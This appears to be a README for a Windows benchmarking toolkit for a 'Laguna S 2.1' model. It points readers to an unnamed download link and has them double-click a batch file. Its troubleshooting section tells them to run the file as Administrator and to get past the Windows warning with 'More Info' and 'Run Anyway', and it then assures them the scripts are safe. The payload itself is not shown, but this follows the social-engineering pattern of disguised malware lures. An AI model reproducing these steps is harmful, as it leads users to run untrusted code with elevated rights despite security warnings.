📋 Overview

This project provides tools to test and run the Poolside Laguna S 2.1 model. These scripts allow you to measure system speed and performance. You get clear data after every run. This helps you understand how your machine handles complex tasks.

💻 System Requirements

Your computer needs sufficient resources to run these tools. Ensure you meet these standards before you start:

  • Windows 10 or Windows 11.
  • At least 16GB of system memory.
  • A modern graphics card with 8GB of video memory.
  • A solid-state drive with 20GB of free space.

🚀 Getting Started

Follow these steps to set up the software. Take your time with each phase to ensure a smooth setup.

1. Download the Files

Visit the main download page to obtain the necessary installation files. Use the link below to reach the latest version of the toolkit.

Click here to visit the download page

2. Prepare Your Windows Environment

After you download the folder, move it to your desktop. Right-click the folder and choose Extract All. This creates a new folder with all the tools inside. Open this folder to see the scripts.

3. Running the Scripts

Locate the file named run-benchmark.bat. Double-click this file. A black command window appears on your screen. Do not close this window. It processes the model data and shows the progress of your test.

⚙️ Troubleshooting

If the script does not start, check for permission errors. Right-click the file and select Run as Administrator. If you see a warning from Windows, click More Info and then select Run Anyway. This confirms you trust the local script.

📊 Understanding Results

Once the processing ends, the window displays your score. The score ranks your system against others. Higher scores mean your machine handles the Laguna S 2.1 model with more speed. The script saves these results to a text file inside the logs subfolder.

🛡️ Security

The scripts run only on your local machine. No data leaves your network during the test. You control every file that executes on your system. Keep your antivirus software active while using these tools to ensure system integrity.
